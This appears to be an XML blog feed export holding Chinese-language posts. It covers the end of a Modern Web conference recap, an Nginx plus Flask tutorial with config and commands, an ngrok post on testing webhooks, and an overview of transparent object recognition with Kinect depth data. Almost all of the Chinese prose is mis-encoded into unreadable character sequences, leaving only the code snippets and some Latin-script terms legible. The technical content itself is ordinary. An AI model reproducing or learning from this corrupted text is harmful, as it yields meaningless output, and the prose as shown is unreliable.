æ™‚é–“æŒæ¡çš„è©±æˆ‘è¦ºå¾—ç®—æ˜¯é‚„è¡Œï¼Œå°±å¾ŒåŠéƒ¨åˆ†å¯èƒ½æœ‰ä¸€é»é»è¶•ï¼Œä½†çµæŸçš„æ™‚å€™æ˜¯å‰›å¥½ 40 åˆ†é˜å·¦å³ï¼Œæˆ‘æœ‰æŠŠæˆ‘æƒ³è¬›çš„å¤§æ¦‚éƒ½å‚³é”å‡ºä¾†ã€‚æœƒå¾Œä¹Ÿæœ‰ä¸€äº›è½çœ¾ä¾†æ‰¾æˆ‘äº¤æµï¼Œä¹‹å¾Œæœ‰æ©Ÿæœƒçš„è©±å¯ä»¥æŠŠé€™å€‹ç°¡å ±è®Šæˆå¹¾ç¯‡ç³»åˆ—æ–‡å¥½å¥½è¬›ä¸€ä¸‹é€™å€‹ä¸»é¡Œï¼Œæˆ–æ˜¯æˆ‘æœ‰åœ¨æƒ³ä¹¾è„†ç›´æ¥ç”¨ã€Œå¦‚ä½•ç”¨ Redux è™•ç† APIã€å»é–‹ä¸€å ‚ä»˜è²»çš„ç·šä¸Šèª²ç¨‹ï¼Œç•¢ç«Ÿå½±ç‰‡è¬›çš„é‚„æ˜¯æœƒæ¯”è¼ƒæ¸…æ¥šä¸€é»ã€‚
ä¸éä¸€åˆ‡éƒ½é‚„åœ¨è¦åŠƒéšæ®µå•¦ï¼Œå¦‚æœæœ‰èˆˆè¶£çš„è©±ä¹Ÿæ­¡è¿ç•™è¨€è®“æˆ‘çŸ¥é“ã€‚
èˆ‡æœƒå¿ƒå¾—èˆ‡ç¸½çµé€™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡åƒåŠ  Modern Webï¼Œå…¶å¯¦æˆ‘å¾ˆå°‘åƒåŠ  confï¼Œä¸Šä¸€æ¬¡åƒåŠ çš„å¯èƒ½æ˜¯ 2015 çš„ JSDC è·Ÿä¸çŸ¥é“ä»€éº¼æ™‚å€™çš„ COSCUPï¼Œæ‰€ä»¥ç¬¬ä¸€é»è®“æˆ‘è¦ºå¾—ä¸ä¸€æ¨£çš„æ˜¯å ´åœ°ï¼Œæˆ‘åŸæœ¬é æœŸçš„å ´åœ°æ˜¯åƒä¸­ç ”é™¢é‚£æ¨£æ¯å€‹äººéƒ½æœ‰æ¡Œå­éƒ½æœ‰æ’åº§é‚£ç¨®ï¼Œä½†é€™æ¬¡åªæœ‰å‰æ’æœ‰ï¼Œå¾Œæ’éƒ½æ˜¯é¡å¤–å†æ”¾ä¸Šå»çš„æ¤…å­ç„¶å¾Œæ²’æœ‰æ¡Œå­ã€‚
ä»¥å ´åœ°ä¾†èªªï¼Œå…¶å¯¦æ¯”è¼ƒåƒä¸€äº›å¤§å…¬å¸è¾¦çš„æ´»å‹•ä¾‹å¦‚èªª AWS Summit ä¹‹é¡çš„ï¼Œä¸éæˆ‘ä¹Ÿæ²’æœ‰è¦ºå¾—é€™å€‹å ´åœ°æœ‰å•é¡Œï¼Œå› ç‚ºä¸­ç ”é™¢çš„å ´åœ°å¯èƒ½å·²ç¶“æ˜¯é ‚ç´šçš„äº†ï¼Œæ‰€ä»¥å…¶ä»–å ´åœ°æ²’æœ‰é‚£éº¼å¥½æˆ‘å¯ä»¥ç†è§£ã€‚
å†ä¾†æ˜¯æœƒå ´å¤–é¢æœ‰é›¶é£Ÿå¯ä»¥æ‹¿ï¼Œé€™é»ä¸éŒ¯ï¼Œä½†æ¯”è¼ƒå¥‡æ€ªçš„ä¸€é»æ˜¯æ‹¿äº†ä¹‹å¾Œå¯ä»¥å¸¶åˆ°è£¡é¢å»åƒï¼Œæ²’è¨˜éŒ¯çš„è©±å¥½åƒå¾ˆå¤šç ”è¨æœƒçš„å ´åœ°è£¡é¢éƒ½æ˜¯ç¦æ­¢é£²é£Ÿçš„ï¼Œå¦‚æœè¦åƒæ±è¥¿çš„è©±è¦åˆ°å¤–é¢ä¾†ã€‚æˆ‘è‡ªå·±è¦ºå¾—å°ä¸Šåœ¨è¬›è©±ç„¶å¾Œå°ä¸‹åœ¨åƒé›¶é£Ÿå…¶å¯¦æ»¿å¥‡æ€ªçš„ï¼ˆæœ‰ç¨®çœ‹é›»å½±é…çˆ†ç±³èŠ±çš„æ„Ÿè¦ºï¼‰ï¼Œè€Œä¸”å’€åš¼è²è·Ÿä¸€äº›é–‹æ±½æ°´çš„è²éŸ³éƒ½æœƒå½±éŸ¿åˆ°åˆ¥äººã€‚é™¤æ­¤ä¹‹å¤–æˆ‘è¦ºå¾—æ²’ä»€éº¼å•é¡Œï¼Œç„¶å¾Œè¬›è€…è¬›å®Œä¹‹å¾Œæœƒåˆ°å¤–é¢å›ºå®šå€åŸŸåè‘—é€™ä¸€é»å¾ˆæ£’ï¼Œå› ç‚ºä½ æœ‰å•é¡Œçš„è©±å°±å¯ä»¥çŸ¥é“è¬›è€…åœ¨å“ªé‚Šç„¶å¾Œç›´æ¥å»æ‰¾ä»–ã€‚
ç¸½ä¹‹æ•´é«”çš„æ„Ÿè¦ºéƒ½ä¸éŒ¯ï¼Œå¾ˆå¤šè¬›é¡Œæˆ‘ä¹Ÿéƒ½æ»¿å–œæ­¡çš„ï¼Œç¥ Modern Web ä¸€å¹´æ¯”ä¸€å¹´é †åˆ©ï¼
é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>modern web</tag>
        <tag>conference</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx + Flask å‹•æ…‹èˆ‡éœæ…‹é é¢åˆ†é›¢å…¥é–€æ•™å­¸</title>
    <url>/2018/08/11/nginx-static-dynamic-page-server-intro/</url>
    <content><![CDATA[
å‰è¨€Nginxï¼ˆç™¼éŸ³ï¼šengine xï¼‰æ˜¯ä¸€å€‹éåŒæ­¥çš„ Web ä¼ºæœå™¨ï¼Œä¹Ÿå¯ä»¥ç”¨ä½œåå‘ä»£ç†ï¼Œè² è¼‰å¹³è¡¡å™¨å’Œ HTTP å¿«å–ç­‰åŠŸèƒ½ã€‚Flask å‰‡æ˜¯ä¸€å€‹ä½¿ç”¨ Python ç·¨å¯«çš„è¼•é‡ç´š Web æ‡‰ç”¨æ¡†æ¶ã€‚ 
æœ‰äº›è®€è€…å¯èƒ½æ˜¯å­¸ç”Ÿæˆ–æ˜¯äº‹æ¥­å‰›èµ·æ­¥çš„ startupï¼Œå¾€å¾€ç‚ºäº†çœéŒ¢æˆ–æ˜¯é–‹ç™¼æ–¹ä¾¿æœƒéœ€è¦å°‡ web å‰å¾Œç«¯éƒ½æ”¾åœ¨åŒä¸€å°æ©Ÿå™¨ä¸Šï¼Œæœ¬æ–‡å¸Œæœ›é€éç°¡å–®ç¯„ä¾‹ä¾†å»ºç«‹ä¸€å€‹å‰å¾Œç«¯æ”¾åœ¨åŒä¸€å° server çš„å…¥é–€æ•™å­¸ï¼Œå…¶ä¸­éœæ…‹æª”æ¡ˆç”± nginx ä¾†è² è²¬ serveï¼Œè€Œå‹•æ…‹æª”æ¡ˆå‰‡ç”± flask app + é–‹ç™¼ç”¨ä¼ºæœå™¨ä¾†æä¾› api endpointï¼ˆé€™é‚Šå› ç‚ºæ•™å­¸æ–¹ä¾¿ï¼Œä¸€èˆ¬ production ä¸Šå»ºè­°ä½¿ç”¨ uwsgi æˆ–æ˜¯ gunicornï¼Œä¸è¦ä½¿ç”¨é–‹ç™¼ç”¨ä¼ºæœå™¨ï¼‰
ç’°å¢ƒå»ºç½®å·¥æ¬²å–„å…¶äº‹ï¼Œå¿…å…ˆåˆ©å…¶å™¨ã€‚åœ¨é–‹ç™¼æ‡‰ç”¨ç¨‹å¼ä¹‹å‰å¾€å¾€éœ€è¦è¨­å®šå¥½ç’°å¢ƒï¼Œé€™é‚Šæˆ‘å€‘ä½¿ç”¨ä¸€å° Ubuntu 18.04 LTS serverï¼Œå®‰è£ python å’Œè™›æ“¬é–‹ç™¼ç’°å¢ƒä»¥åŠ nginx ç­‰ç›¸é—œå¥—ä»¶ç­‰ã€‚
$ sudo apt install python3-pip python3-dev build-essential libssl-dev libffi-dev python3-setuptools$ sudo apt install nginx$ sudo apt install python3-venv

è¨­å®š nginx configé€™é‚Šç‚ºäº†æ–¹ä¾¿æˆ‘å€‘ç›´æ¥æ›´æ”¹ site-available&#x2F;default config å¦‚ä¸€ä¸‹æª”æ¡ˆè¨­å®šï¼ˆsite-available ä¸‹å¯å­˜å¤šå€‹è¨­å®šï¼ŒçœŸæ­£ä½¿ç”¨æ˜¯åœ¨ site-enabled è³‡æ–™å¤¾ä¸‹ï¼Œé€šå¸¸æœƒç”¨ link é€£çµéå»ï¼‰ï¼š
server &#123;        listen 80;        root /var/www; # serve éœæ…‹æª”æ¡ˆä½ç½®        index index.html;        location ^~ /api/v1 &#123; # ç•¶ api prefix request éä¾†æœƒ proxy çµ¦ 5000 port çš„ local api service                proxy_pass http://127.0.0.1:5000;                proxy_set_header Host $host; # åœ¨ proxy request æ™‚ä¿ç•™ client çš„ header        &#125;&#125;

é‡æ–°è®€å– config æª”æ¡ˆ
$ sudo nginx -s reload
è‹¥ä¸æ˜¯ä½¿ç”¨ default config æª”æ¡ˆï¼Œä¹Ÿå¯ä»¥è‡ªå·±é–‹ä¸€å€‹æ–°çš„æª”æ¡ˆè¨­å®š config æª”æ¡ˆï¼Œæœ€å¾Œè¦æŠŠè¨­å®šå¥½çš„ demo.conf link åˆ°çœŸæ­£åœ¨ä½¿ç”¨çš„ sites-enabled config è³‡æ–™å¤¾
$ sudo ln -s /etc/nginx/sites-available/demo.conf /etc/nginx/sites-enabled/
æ’°å¯«æ¸¬è©¦ç”¨éœæ…‹ç¶²é æ’°å¯«ä¸€å€‹æ¸¬è©¦éœæ…‹é é¢ï¼Œæ­£å¼æƒ…æ³å¯èƒ½æœƒæ˜¯ä¸€å€‹ build å¥½çš„ html æª”æ¡ˆï¼Œè£¡é¢æœ‰å« HTML&#x2F;CSS&#x2F;JS ç­‰å‰ç«¯éœæ…‹æª”æ¡ˆï¼ˆå¯èƒ½æœ‰ä½¿ç”¨å‰ç«¯æ¡†æ¶ï¼‰
/var/www/index.html&lt;h1&gt;Hello Nginx based static Page!!!&lt;/h1&gt;

é€™æ™‚å€™åœ¨ç€è¦½å™¨è§€çœ‹ä½ çš„ server ip æ‡‰è©²æœƒçœ‹åˆ°ä¸‹åˆ—éœæ…‹æª”æ¡ˆç•«é¢ï¼š
æ’°å¯« Flask å‹•æ…‹ç¶²ç«™æ¥è‘—æˆ‘å€‘ä¾†æ’°å¯«å¾Œç«¯ api serviceï¼Œé¦–å…ˆå…ˆå»ºç«‹è™›æ“¬é–‹ç™¼ç’°å¢ƒå’Œå®‰è£å¥—ä»¶ï¼š
$ sudo python3.6 -m venv venv$ source venv/bin/activate$ sudo pip3 install flask

index.py å…§å®¹ï¼Œè¨­è¨ˆä¸€å€‹æ¸¬è©¦ç”¨ api endpointï¼Œæä¾› GET movies list
/var/www/index.pyfrom flask import Flask, jsonifyapp = Flask(__name__)@app.route(&quot;/api/v1/movies&quot;)def get_api():    movies = [&#123;&#x27;name&#x27;: &#x27;åˆºæ¿€1995&#x27;&#125;, &#123;&#x27;name&#x27;: &#x27;æ•™çˆ¶&#x27;&#125;]    return jsonify(movies)

æˆæœå±•ç¾é€™æ™‚å€™åœ¨è™›æ“¬ç’°å¢ƒä¸‹åŸ·è¡Œè³‡æ–™å¤¾çš„ index.py æª”æ¡ˆï¼š
$ FLASK_APP=index.py flask run

é€™æ™‚å€™åœ¨ç€è¦½å™¨è§€çœ‹ä½ çš„ SERVER_ID&#x2F;api&#x2F;v1&#x2F;moviesï¼Œæ‡‰è©²æœƒçœ‹åˆ° fake api å›å‚³çš„ json é›»å½±è³‡æ–™ï¼š
ç¸½çµä»¥ä¸Šæˆ‘å€‘è¨è«–äº†ç°¡å–®çš„ nginx + flask å‹•&#x2F;éœæ…‹æª”æ¡ˆåˆ†é›¢çš„ server å»ºç½®å…¥é–€æ•™å­¸ï¼Œè‹¥æ˜¯æ›´è¤‡é›œçš„æ¶æ§‹ä¹Ÿå¯ä»¥æŠŠç³»çµ±é€²è¡ŒçœŸæ­£çš„å‰å¾Œç«¯åˆ†é›¢ç”šè‡³æ˜¯è³‡æ–™åº«çš„è®€å¯«åˆ†é›¢ç­‰ã€‚ä½†ç¤™æ–¼ç¯‡å¹…æˆ‘å€‘ä»Šå¤©å°±ä»‹ç´¹åˆ°é€™é‚Šï¼Œé—œæ–¼æ›´å¤šç³»çµ±è¨­è¨ˆå’Œæ¶æ§‹è¨­è¨ˆçš„è¨è«–æˆ‘å€‘ä¸‹æ¬¡è¦‹å›‰ï½
å»¶ä¼¸é–±è®€
Flask å®˜ç¶²
Nginx å®˜ç¶²

ï¼ˆimage via matplotlib
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>Flask</tag>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>æ¸¬è©¦ webhook ä¸å†ç…©æƒ±ï¼šngrok</title>
    <url>/2018/05/24/ngrok/</url>
    <content><![CDATA[å‰è¨€ä»¥å‰åœ¨é–‹ç™¼ Chatbot çš„æ™‚å€™ï¼Œç™¼ç¾æœ€å›°é›£çš„ä¸æ˜¯å¯«ç¨‹å¼ï¼Œè€Œæ˜¯æ¸¬è©¦ã€‚
ç‚ºä»€éº¼å‘¢ï¼Ÿå› ç‚º Chatbot çš„åŸç†å°±æ˜¯æ¥æ”¶åˆ°è¨Šæ¯æ™‚ç™¼é€ä¸€å€‹ request åˆ°ä½ æŒ‡å®šçš„ä½ç½®ï¼ˆwebhookï¼‰ï¼Œä½ å† call API ç„¶å¾Œå›è¨Šæ¯ã€‚
å¯æ˜¯å‘¢ï¼Œé€™å€‹ webhook url é€šå¸¸éƒ½æœƒæœ‰å…©å€‹éœ€æ±‚ï¼š

å¿…é ˆè¦æœ‰ä¸€å€‹ domainï¼ˆä¸èƒ½åªæœ‰ IPï¼‰
è¦æ˜¯ https


å› æ­¤æ¸¬è©¦çš„æµç¨‹å°±è®Šæˆé€™æ¨£ï¼š

åœ¨ local ç«¯å…ˆ codingï¼Œç”¨è‚‰çœ¼ debug çœ‹ä¼¼ä¸€åˆ‡éƒ½æ²’å•é¡Œ
ä¸Šå‚³åˆ° server
åœ¨èŠå¤©å¹³å°ä¸Šæ¸¬è©¦ï¼Œçœ‹æœ‰æ²’æœ‰æ”¶åˆ°è¨Šæ¯
çœ‹ server çš„ log debug
ç™¼ç¾å•é¡Œï¼Œæ”¹ codeï¼Œå›åˆ°æ­¥é©Ÿ 1

çœŸæ­£çš„ debug æµç¨‹æ˜¯ç™¼ç”Ÿåœ¨ server ä¸Šé¢ï¼Œå› ç‚ºèŠå¤©å¹³å°åªèƒ½æ¥å—çœŸçš„ domainï¼Œæ‰€ä»¥ä½ ä¹Ÿæ²’è¾¦æ³•åœ¨ä½ çš„ localhost æ¸¬è©¦ã€‚
ç¾åœ¨çš„ç‹€æ³æ‡‰è©²å¥½å¾ˆå¤šäº†ï¼Œä¸€é–‹å§‹ Chatbot å‰›å‡ºä¾†ï¼Œå¤§å®¶éƒ½é‚„åœ¨æ‘¸ç´¢ç„¶å¾Œå®˜æ–¹æ–‡ä»¶åˆå¯«å¾—ä¸æ¸…ä¸æ¸…æ¥šçš„æ™‚å€™ï¼Œä¾†ä¾†å¾€å¾€å°±æœƒèŠ±å¾ˆå¤šæ™‚é–“ã€‚ä½ æœ‰å¯èƒ½æœƒå‚³éŒ¯åƒæ•¸ï¼Œæˆ–æ˜¯æéŒ¯ functionã€‚
æ­£ç•¶æˆ‘æ„Ÿåˆ°çµ•æœ›çš„æ™‚å€™ï¼Œæœ‰æœ‹å‹è·Ÿæˆ‘èªªäº†ï¼šä½ ç‚ºä»€éº¼ä¸ç”¨ ngrok å‘¢ï¼Ÿ
Debug çš„æ•‘æ˜Ÿï¼šngrokä¸€å¥è©±ä»‹ç´¹ä»€éº¼æ˜¯ ngrokï¼š

ä¸€å€‹å¯ä»¥æŠŠä½  localhost å°æ‡‰åˆ° https public domain çš„æœå‹™

ä¾‹å¦‚èªªæŠŠä½ çš„ localhost:5000 å°æ‡‰åˆ° https://fj2rijo3.ngrok.comã€‚
é€™æ¨£å­åšä¹‹å¾Œçš„å¥½è™•å°±é¡¯è€Œæ˜“è¦‹äº†ï¼Œä½ åªè¦æŠŠ webhook çš„ URL å¡«å°æ‡‰åˆ°çš„é‚£å€‹ï¼ˆå®Œå…¨ç¬¦åˆé‚£å…©å€‹æ¢ä»¶ï¼‰ï¼Œå°±å¯ä»¥åœ¨ localhost ä¸Šé¢æ¸¬è©¦äº†ï¼
é™¤æ­¤ä¹‹å¤–ï¼Œä½¿ç”¨ä¸Šä¹Ÿè¶…ç´šç„¡æ•µç°¡å–®ã€‚
ä½ å°±å»ngrok å®˜ç¶²è¨»å†Šå¸³è™Ÿã€ä¸‹è¼‰ä¸€å€‹ç¨‹å¼ï¼Œè¨­å®šå¥½ auth token ä¹‹å¾Œï¼Œå°±å¯ä»¥é ä¸€å€‹æŒ‡ä»¤åšåˆ°æˆ‘å‰›å‰›è¬›çš„äº‹äº†ã€‚
./ngrok http 5000 

åªè¦é€™è¡ŒæŒ‡ä»¤ï¼Œå°±å¯ä»¥æŠŠä½ çš„ 5000 port å°æ‡‰åˆ°ä¸€å€‹ ngrok æä¾›çš„ https domainã€‚

é™¤æ­¤ä¹‹å¤–ï¼Œåœ¨ console ä¹Ÿæœƒä¸æ–·å°å‡º request çš„è¨Šæ¯ï¼Œè®“ä½ å¯ä»¥ç°¡å–®çœ‹åˆ°æœ‰å“ªäº› request ä»¥åŠ server å›è¦†çš„ç‹€æ…‹ç¢¼æ˜¯ä»€éº¼ã€‚
ç¸½ä¹‹å‘¢ï¼Œæœ‰äº†é€™å€‹ ngrok çš„ https domain ä»¥å¾Œï¼Œä½ å°±å¯ä»¥æŠŠé€™å€‹ç¶²å€å¡«åˆ° webhook url ä¸Šé¢å»æ¸¬è©¦äº†ï¼
ç¸½çµé€™æ¬¡æœƒå¯«å‡ºé€™ç¯‡æ–‡ç« æ˜¯å› ç‚ºæˆ‘æœ€è¿‘åˆå†æ¬¡é«”é©—åˆ°äº† ngrok çš„å¼·å¤§ä¹‹è™•ã€‚é€™é™£å­åœ¨ debug ä¸€å€‹ PWAï¼Œç™¼ç¾ service worker åœ¨ localhost å®Œå…¨æ­£å¸¸ï¼Œå¯æ˜¯ deploy åˆ° server å»çš„æ™‚å€™ lighthouse çš„åµæ¸¬å°±å¤±æ•—äº†ã€‚
å¦‚æœæŒ‰ç…§æ­£å¸¸çš„æµç¨‹ï¼Œå„˜ç®¡ä½ åªæ˜¯æ”¹ä¸€è¡Œ codeï¼Œä¹Ÿè¦èŠ±è²»ååˆ†é˜è·‘ CI&#x2F;CDï¼Œæ‰€ä»¥ä¸€å°æ™‚ä¹‹å…§ä½ åªæœ‰å…­æ¬¡æ”¹ code çš„æ©Ÿæœƒï¼Œä¸èƒ½å†å¤šäº†ã€‚
å¾Œä¾†æˆ‘æƒ³èµ·æœ‰ ngrok é€™å€‹ååˆ†å¥½ç”¨çš„æ±è¥¿ï¼Œå°±æŠŠ ngrok å°æ‡‰åˆ° localhost ä¾†æ¸¬äº†ï¼Œå¥½è™•å°±æ˜¯ä½ æ”¹ä»»ä½• code éƒ½å¯ä»¥å³æ™‚åæ‡‰ï¼Œæ•ˆç‡çœŸçš„æ˜¯å¥½å¾ˆå¤šã€‚
ä¸‹æ¬¡å¦‚æœä½ ä¹Ÿéœ€è¦ä¸€å€‹ https çš„ç¶²å€ä¾† debugï¼Œé‚£æˆ‘èª å¿ƒæ¨è–¦ä½  ngrokã€‚
é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>ngrok</tag>
      </tags>
  </entry>
  <entry>
    <title>Object Recognition Kitchen é€æ˜ç‰©é«”è¾¨è­˜(æ¼”ç®—æ³•æ¦‚å¿µ)</title>
    <url>/2016/12/24/object-recognition-kitchen/</url>
    <content><![CDATA[å‰è¨€é€™æ¬¡çš„æ–‡ç« æƒ³è¦è¨è«–ä¸€å€‹æœ‰è¶£çš„é¡Œç›® â€“ é€æ˜ç‰©é«”è¾¨è­˜ï¼Œé€™æ¬¡çš„ä»‹ç´¹å…ˆæŠŠé¡Œç›®é™å®šåœ¨æ‰¾å‡ºé€æ˜ç‰©é«”çš„ä½ç½®ï¼Œä¸¦æŠŠé€æ˜ç‰©é«”çš„è¼ªå»“æ‰¾å‡ºä¾†ã€‚
æ¼”ç®—æ³•åŠŸèƒ½ç°¡ä»‹æˆ‘å€‘çš„æ¼”ç®—æ³•ç›®çš„æ˜¯è¦æ‰¾å‡ºå½±åƒä¸­çš„é€æ˜ç‰©é«”ï¼Œä¸¦æŠŠè¼ªå»“åœˆå‡ºä¾†ï¼Œå°±åƒä¸‹é¢é€™å¼µåœ–ä¸€æ¨£ã€‚

å…¶å¯¦å¦‚æœè¦æ›´ç²¾ç¢ºï¼Œæ‡‰è©²æŠŠæƒ³è¦è¾¨è­˜å“ªäº›é€æ˜ç‰©é«”ã€åœ¨é‚£äº›å ´æ™¯ã€è¾¨è­˜æˆåŠŸç‡å¸Œæœ›æœ‰å¤šé«˜ã€å¦‚ä½•å®šç¾©è¾¨è­˜æˆåŠŸç­‰éƒ½èªªæ¸…æ¥šï¼Œä¸éé€™é‚Šæƒ³å…ˆå¸¶çµ¦å¤§å®¶ä¸€å€‹åˆæ­¥çš„æ¦‚å¿µï¼Œå°±ä¸è¨è«–å¾—å¤ªéç‘£ç¢ã€‚
æ¼”ç®—æ³•æ¦‚å¿µç‚ºäº†é”æˆé€™å€‹åŠŸèƒ½ï¼Œæˆ‘å€‘å‹¢å¿…è¦å…ˆæ”¶åˆ°å½©è‰²å½±åƒï¼Œæ‰€ä»¥è‚¯å®šéœ€è¦ä¸€å°ç›¸æ©Ÿã€‚ä¸éä¸‹ä¸€å€‹å•é¡Œæ˜¯ï¼Œæˆ‘å€‘åªéœ€è¦ç”¨å½©è‰²å½±åƒè³‡è¨Šå°±èƒ½å¤ æŠ“åˆ°é€æ˜ç‰©é«”çš„è¼ªå»“å—? é‚„æ˜¯æˆ‘å€‘éœ€è¦å…¶ä»–çš„è³‡è¨Š (ä¹Ÿå°±æ˜¯è¦ä¸è¦è€ƒæ…®ä½¿ç”¨å…¶ä»–çš„ sensor) ?
è¦å›ç­”ä¸Šé¢çš„å•é¡Œï¼Œé¦–å…ˆè¦ä¾†æƒ³æƒ³é€™å€‹å•é¡Œæœƒä»€éº¼æœƒå›°é›£ã€‚ç›´è¦ºä¸Šæ‡‰è©²å¾ˆå®¹æ˜“ç™¼ç¾ï¼Œé€æ˜ç‰©é«”çš„é¡è‰²æœƒéš¨è‘—èƒŒæ™¯é¡è‰²ä¸åŒè€Œè®Šï¼Œæ‰€ä»¥ä¸€èˆ¬ç”¨é¡è‰²ã€ç´‹ç†ç‰¹å¾µä¾†è¾¨è­˜çš„æ¼”ç®—æ³•éƒ½ä¸å¤ªé©ç”¨ï¼›æ­¤å¤–ï¼Œå› ç‚ºé€æ˜ç‰©é«”çš„é‚Šç•Œå¸¸å¸¸æ˜¯æ¨¡ç³Šä¸æ¸…çš„ï¼Œæ‰€ä»¥è·Ÿæ—é‚Šçš„ç‰©é«”å¾ˆå®¹æ˜“æ··åœ¨ä¸€èµ·ï¼Œé€ æˆè¼ªå»“æŠ“éŒ¯ã€‚æ‰€ä»¥æ ¸å¿ƒçš„å•é¡Œå°±æ˜¯ï¼Œé™¤äº†é¡è‰²ã€é‚Šç·£é€™äº›å¸¸ç”¨çš„ç‰¹å¾µï¼Œæˆ‘å€‘é‚„å¯ä»¥ç”¨ä»€éº¼è³‡è¨Šä¾†æŠ“é€æ˜ç‰©é«”? æœ‰ä¸€ç¯‡è«–æ–‡æå‡ºä¸€å€‹æ»¿æœ‰è¶£çš„åšæ³•ï¼Œä»–æ˜¯ä½¿ç”¨ Kinect çš„æ·±åº¦è³‡è¨Šï¼Œè€Œä¸”åˆ©ç”¨é€æ˜ç‰©é«”åœ¨ Kinect çš„æ·±åº¦åœ–è£¡é¢æœƒæœ‰ç ´æ´çš„ç‰¹æ€§ï¼Œç•¶æˆä¸€å€‹è¾¨è­˜çš„èµ·é»:

é€™å€‹æ¦‚å¿µä¸»è¦ä¾†è‡ªé€™ç¯‡è«–æ–‡ â€“ Recognition and Pose Estimation of Rigid Transparent Objects with a Kinect Sensorï¼Œä»–æå‡ºçš„åšæ³•æ˜¯ï¼Œåˆ©ç”¨æ·±åº¦åœ–è£¡é¢æœ‰å¤§å¡Šç ´æ´çš„ä½ç½®ï¼ŒçŒœæ¸¬é€™å¡Šä½ç½®æ˜¯é€æ˜ç‰©é«”ï¼Œæ¥è‘—å†æ ¹æ“šé€™å€‹ç·šç´¢æ‰¾å‡ºé€æ˜ç‰©é«”çš„è¼ªå»“ã€‚
æ‰€ä»¥ä¸‹ä¸€å€‹å•é¡Œå°±æ˜¯ï¼Œæ€éº¼æ ¹æ“šé€™å€‹ç²—ç•¥çš„ä½ç½®ï¼ŒæŠŠé€æ˜ç‰©é«”çš„è¼ªå»“åˆ‡å‡ºä¾†ï¼Œè«–æ–‡ä¸­ä½¿ç”¨çš„æ–¹æ³•æ˜¯ Grabcut æ¼”ç®—æ³•ï¼Œé€™å€‹æ¼”ç®—æ³•éœ€è¦å…ˆæœ‰ä¸€å€‹åˆå§‹çš„å‰æ™¯è·ŸèƒŒæ™¯ç·šæ®µï¼Œç„¶å¾Œæ ¹æ“šé€™å€‹ç·šæ®µå€åˆ†å‡ºå‰æ™¯è·ŸèƒŒæ™¯ï¼Œä¾‹å¦‚åœ¨ä¸‹åœ–ä¸­ï¼Œç´…è‰²ç·šæ®µæ˜¯å‰æ™¯ã€è—è‰²ç·šæ®µæ˜¯èƒŒæ™¯ï¼Œæ¥è‘— Grabcut æ¼”ç®—æ³•æœƒæ ¹æ“šé¡è‰²çš„è¿‘ä¼¼ç¨‹åº¦é‚„æœ‰è·é›¢é—œä¿‚ï¼Œç®—å‡ºç¶ è‰²æ¡†æ¡†å…§é‚£äº›æ˜¯å‰æ™¯ã€å“ªäº›æ˜¯èƒŒæ™¯ï¼Œç„¶å¾ŒæŠŠå‰æ™¯åˆ‡å‡ºä¾†ã€‚

åˆ‡å‡ºä¾†ä¹‹å¾Œï¼Œç›®çš„å°±ç®—æ˜¯é”æˆäº†ï¼ç•¶ç„¶å¾ŒçºŒé‚„æœ‰å¾ˆå¤šå•é¡Œå¾…è¨è«–ï¼ˆä¾‹å¦‚èƒŒæ™¯çš„è¤‡é›œåº¦ã€æ€éº¼å°æ·±åº¦å½±åƒä¸­çš„ç ´ç¢é»åšä¸€äº›åŸºæœ¬çš„è™•ç†ç­‰ï¼‰ï¼Œä¸éä»Šå¤©å…ˆæŠŠç¯„åœé™ç¸®åœ¨æœ€ä¸Šå±¤çš„æ¦‚å¿µã€‚
ç¸½çµæ¼”ç®—æ³•çš„æ‡‰ç”¨çœŸçš„æ˜¯åƒå¥‡ç™¾æ€ªï¼Œä½†ä¸ç®¡æ˜¯ç°¡å–®çš„æ¼”ç®—æ³•é¡Œç›®é‚„æ˜¯å›°é›£çš„æ¼”ç®—æ³•é¡Œç›®ï¼Œè§£æ±ºçš„æ–¹æ³•éƒ½æ˜¯è¦çœ‹å‡ºå•é¡Œçš„æœ¬è³ªï¼Œç„¶å¾Œå†æ ¹æ“šé€™å€‹å•é¡Œçš„ç‰¹æ€§å»ä½¿ç”¨ç‰¹å®šçš„æ­¥é©Ÿä¾†è§£æ±ºã€‚åƒé€™å€‹ç¯„ä¾‹å°±æ˜¯å·§å¦™åœ°åˆ©ç”¨ Kinect ç‰¹æ€§ä¾†è™•ç†é€æ˜ç‰©é«”çš„ç‰¹å¾µå¾ˆé›£æŠ“çš„é€™å€‹å•é¡Œï¼Œç•¢ç«Ÿæœƒåœ¨ Kinect çš„æ·±åº¦åœ–ä¸­å›ºå®šå‘ˆç¾å‡ºç ´æ´ä¹Ÿç®—æ˜¯ä¸€ç¨®ç‰¹å¾µï¼Œè‡³æ–¼æ›´è©³ç´°çš„æ¼”ç®—æ³•æµç¨‹æˆ–æ˜¯ç¨‹å¼ç¢¼çš„éƒ¨åˆ†ï¼Œå°±ç•™å¾…æœªä¾†å†ä»‹ç´¹å›‰ï¼
å»¶ä¼¸é–±è®€æ¼”ç®—æ³•ä»‹ç´¹æŠ•å½±ç‰‡ORK çš„ transparent object recognition page
é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººè·Ÿé›»è…¦è¦–è¦ºæœ‰å°‘è¨±ç ”ç©¶ï¼Œæœ€è¿‘åœ¨é›éŠè‡ªå·±çš„åŸ·è¡ŒåŠ›
]]></content>
      <tags>
        <tag>algorithm</tag>
        <tag>æ¼”ç®—æ³•</tag>
        <tag>æ©Ÿå™¨äºº</tag>
